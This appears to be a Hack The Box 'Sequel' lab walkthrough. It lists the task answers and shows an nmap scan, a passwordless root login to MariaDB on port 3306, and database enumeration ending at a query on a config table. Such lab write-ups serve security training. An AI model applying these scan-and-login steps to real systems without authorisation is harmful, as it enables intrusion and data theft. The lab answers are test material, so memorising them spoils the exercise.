# Sequel
## task 1
Structured Query Language
## task 2
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# nmap -sV -T4 -F <your target ip>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 16:40 UTC
Nmap scan report for <your target ip>
Host is up (0.18s latency).
Not shown: 99 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.85 seconds
```
3306
## task 3
mariaDB
## task 4
```
mysql -u
```
## task 5
root
## task 6 & 7
```
SELECT * FROM <table>;
```
## Submit Flag
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# mysql -h <your target ip> -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.186 sec)

MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.176 sec)
MariaDB [htb]> SELECT * FROM config;
```